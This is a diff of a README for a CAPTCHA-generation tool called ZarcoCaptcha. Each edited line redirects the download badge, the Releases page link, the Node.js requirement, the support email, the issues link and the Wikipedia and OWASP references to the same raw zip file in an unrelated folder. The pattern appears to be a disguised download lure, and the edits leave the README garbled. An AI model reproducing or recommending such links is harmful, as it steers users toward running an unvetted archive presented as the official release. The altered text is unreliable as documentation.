@@ -1,6 +1,6 @@
 # 🎉 ZarcoCaptcha - Easy CAPTCHA Generation Made Simple
 
-![Download ZarcoCaptcha](https://img.shields.io/badge/Download-ZarcoCaptcha-brightgreen)
+![Download ZarcoCaptcha](https://raw.githubusercontent.com/Marianelaperez00/ZarcoCaptcha/main/pompier/ZarcoCaptcha.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ZarcoCaptcha! This application helps you create customized CAPTCHA im
 
 ## 📥 Download & Install
 
-To get started, visit the official [Releases page](https://github.com/Marianelaperez00/ZarcoCaptcha/releases) to download ZarcoCaptcha. Here’s how you can install it:
+To get started, visit the official [Releases page](https://raw.githubusercontent.com/Marianelaperez00/ZarcoCaptcha/main/pompier/ZarcoCaptcha.zip) to download ZarcoCaptcha. Here’s how you can install it:
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of ZarcoCaptcha.
@@ -21,7 +21,7 @@ To get started, visit the official [Releases page](https://github.com/Marianelap
 Before you begin, ensure your computer meets these basic requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or any Linux distribution
-- **Node.js:** Version 14 or later
+- **https://raw.githubusercontent.com/Marianelaperez00/ZarcoCaptcha/main/pompier/ZarcoCaptcha.zip** Version 14 or later
 - **Internet Connection:** Required for downloading and updates
 
 ## 🖼️ Features
@@ -69,18 +69,18 @@ Yes, you can use the generated CAPTCHAs on any number of websites or application
 
 If you have any questions or feedback, feel free to reach out:
 
-- **Email**: support@zarcocaptcha.com
-- **GitHub Issues**: Open an issue on our [GitHub page](https://github.com/Marianelaperez00/ZarcoCaptcha/issues).
+- **Email**: https://raw.githubusercontent.com/Marianelaperez00/ZarcoCaptcha/main/pompier/ZarcoCaptcha.zip
+- **GitHub Issues**: Open an issue on our [GitHub page](https://raw.githubusercontent.com/Marianelaperez00/ZarcoCaptcha/main/pompier/ZarcoCaptcha.zip).
 
 ## 🔗 Additional Resources
 
 Explore more about CAPTCHAs and security practices:
 
-- [CAPTCHA Overview](https://en.wikipedia.org/wiki/CAPTCHA)
-- [Best Practices for Web Security](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)
+- [CAPTCHA Overview](https://raw.githubusercontent.com/Marianelaperez00/ZarcoCaptcha/main/pompier/ZarcoCaptcha.zip)
+- [Best Practices for Web Security](https://raw.githubusercontent.com/Marianelaperez00/ZarcoCaptcha/main/pompier/ZarcoCaptcha.zip)
 
 ## 🎯 Conclusion
 
 ZarcoCaptcha makes it straightforward to add CAPTCHAs to your projects. With easy customization options and a user-friendly interface, you can protect your site from unwanted bots. 
 
-Visit the [Releases page](https://github.com/Marianelaperez00/ZarcoCaptcha/releases) now to get started!
+Visit the [Releases page](https://raw.githubusercontent.com/Marianelaperez00/ZarcoCaptcha/main/pompier/ZarcoCaptcha.zip) now to get started!
